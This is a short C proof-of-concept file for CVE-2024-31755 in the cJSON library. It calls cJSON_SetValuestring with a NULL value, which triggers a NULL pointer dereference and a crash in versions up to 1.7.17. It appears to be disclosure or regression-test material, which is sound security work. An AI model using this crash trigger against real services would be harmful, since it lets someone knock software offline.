/*
 * PoC for CVE-2024-31755 (cJSON Issue #839)
 * Target: NULL pointer dereference in cJSON_SetValuestring
 */
#include <stdio.h>
#include "cJSON.h"

int main(void) {
    printf("[+] Creating string item...\n");
    cJSON *item = cJSON_CreateString("apple");
    if (!item) return 1;

    printf("[+] Invoking cJSON_SetValuestring with NULL value...\n");
    // In <= v1.7.17, this calls strlen(NULL) and causes SIGSEGV / crash
    cJSON_SetValuestring(item, NULL);

    printf("[+] Completed execution safely.\n");
    cJSON_Delete(item);
    return 0;
}